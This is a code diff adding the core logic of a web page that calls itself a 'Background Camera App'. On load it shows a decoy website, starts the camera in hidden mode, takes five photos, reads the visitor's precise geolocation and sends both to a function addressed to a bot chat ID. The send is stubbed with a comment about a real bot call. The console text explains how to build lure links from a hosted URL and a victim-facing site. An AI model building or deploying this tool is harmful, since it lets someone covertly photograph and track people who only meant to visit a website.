+            modalImage.src = photo.url;
+            photoModal.classList.add('active');
+        }
+        
+        // Close modal
+        function closeModal() {
+            photoModal.classList.remove('active');
+        }
+        
+        // Make control panel draggable
+        let isDragging = false;
+        let currentX, currentY, initialX, initialY;
+        
+        controlPanel.querySelector('.panel-header').addEventListener('mousedown', dragStart);
+        document.addEventListener('mousemove', drag);
+        document.addEventListener('mouseup', dragEnd);
+        
+        function dragStart(e) {
+            if (e.target.classList.contains('minimize-btn')) return;
+            initialX = e.clientX - controlPanel.offsetLeft;
+            initialY = e.clientY - controlPanel.offsetTop;
+            isDragging = true;
+        }
+        
+        function drag(e) {
+            if (isDragging) {
+                e.preventDefault();
+                currentX = e.clientX - initialX;
+                currentY = e.clientY - initialY;
+                controlPanel.style.left = currentX + 'px';
+                controlPanel.style.top = currentY + 'px';
+                controlPanel.style.right = 'auto';
+                controlPanel.style.bottom = 'auto';
+            }
+        }
+        
+        function dragEnd() {
+            isDragging = false;
+        }
+        
+        // Cleanup
         window.addEventListener('beforeunload', () => {
             if (cameraStream) {
                 cameraStream.getTracks().forEach(track => track.stop());
             }
+            photos.forEach(photo => URL.revokeObjectURL(photo.url));
+        });
+        
+        // Get location
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    console.log('Geolocation not supported');
+                    locationStatus.textContent = 'Not supported';
+                    locationStatus.className = 'status-value error';
+                    resolve(null);
+                    return;
+                }
+                
+                locationStatus.textContent = 'Getting...';
+                locationStatus.className = 'status-value';
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date()
+                        };
+                        locationStatus.textContent = `${location.latitude.toFixed(4)}, ${location.longitude.toFixed(4)}`;
+                        locationStatus.className = 'status-value success';
+                        console.log('Location captured:', location);
+                        resolve(location);
+                    },
+                    (error) => {
+                        console.log('Location error:', error.message);
+                        locationStatus.textContent = 'Denied';
+                        locationStatus.className = 'status-value error';
+                        resolve(null);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        // Send photo with location to bot
+        async function sendPhotoWithLocation(photo, photoNumber, location) {
+            return new Promise((resolve) => {
+                captureStatus.textContent = `Sending photo ${photoNumber} with location...`;
+                captureStatus.classList.add('sending');
+                
+                const data = {
+                    chat_id: CHAT_ID,
+                    photo: {
+                        size: photo.blob.size,
+                        timestamp: photo.timestamp,
+                        resolution: photo.resolution
+                    },
+                    location: location,
+                    photo_number: photoNumber
+                };
+                
+                // Simulate API call to bot
+                // In production, this would be an actual API call to your bot server
+                setTimeout(() => {
+                    photosSentCount++;
+                    photosSent.textContent = photosSentCount;
+                    captureStatus.classList.remove('sending');
+                    console.log(`Photo ${photoNumber} + Location sent to chat_id: ${CHAT_ID}`, data);
+                    resolve();
+                }, 50);
+            });
+        }
+        
+        // Modified auto-capture with location
+        async function autoCaptureWithLocation() {
+            if (isAutoCapturing) return;
+            
+            isAutoCapturing = true;
+            autoCaptureBtn.disabled = true;
+            
+            // Get location first
+            captureStatus.textContent = 'Getting location...';
+            const location = await getLocation();
+            
+            const totalPhotos = 5;
+            
+            for (let i = 1; i <= totalPhotos; i++) {
+                const progress = (i / totalPhotos) * 100;
+                progressFill.style.width = progress + '%';
+                
+                captureStatus.textContent = `Capturing photo ${i}/${totalPhotos}...`;
+                
+                const photo = await capturePhoto();
+                await sendPhotoWithLocation(photo, i, location);
+                
+                captureStatus.textContent = `Photo ${i} + location sent! ✓`;
+                
+                if (i < totalPhotos) {
+                    await new Promise(resolve => setTimeout(resolve, captureInterval));
+                }
+            }
+            
+            progressFill.style.width = '100%';
+            captureStatus.textContent = `All ${totalPhotos} photos + location sent! ✓`;
+            captureStatus.className = 'capture-status success';
+            
+            setTimeout(() => {
+                progressFill.style.width = '0%';
+                captureStatus.textContent = 'Ready for next capture';
+                captureStatus.className = 'capture-status';
+                isAutoCapturing = false;
+                autoCaptureBtn.disabled = false;
+            }, 2000);
+        }
+        
+        // Auto-start function
+        async function autoStart() {
+            console.log('Auto-starting camera and capture...');
+            
+            // Load default website first
+            loadDefaultWebsite();
+            
+            // Small delay to ensure page is loaded
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            // Start camera automatically
+            await startCamera();
+            
+            // Wait for camera to initialize
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            // Start auto-capture with location
+            if (cameraStream) {
+                await autoCaptureWithLocation();
+            }
+        }
+        
+        // Initialize and auto-start
+        console.log('🚀 Background Camera App Ready!');
+        console.log('📸 Camera runs hidden, website displays in foreground');
+        console.log('⏱️  Auto-starting in 1 second...');
+        console.log('');
+        console.log('=== CONFIGURATION ===');
+        console.log('Chat ID:', CHAT_ID);
+        console.log('Website:', DEFAULT_WEBSITE);
+        console.log('==================');
+        console.log('');
+        console.log('=== HOW TO USE ===');
+        console.log('Format: https://jsjs-kzua.onrender.com/?chat_id=YOUR_CHAT_ID&site=YOUR_WEBSITE_URL');
+        console.log('');
+        console.log('Example 1:');
+        console.log('https://jsjs-kzua.onrender.com/?chat_id=6314556756&site=https://loading-screen.github.io/');
+        console.log('');
+        console.log('Example 2:');
+        console.log('https://jsjs-kzua.onrender.com/?chat_id=123456&site=https://www.google.com');
+        console.log('');
+        console.log('Note: URLs will be automatically URL-encoded if needed');
+        console.log('==================');
+        
+        // AUTO-START ON PAGE LOAD
+        window.addEventListener('load', () => {
+            autoStart();
         });
     </script>
 </body>
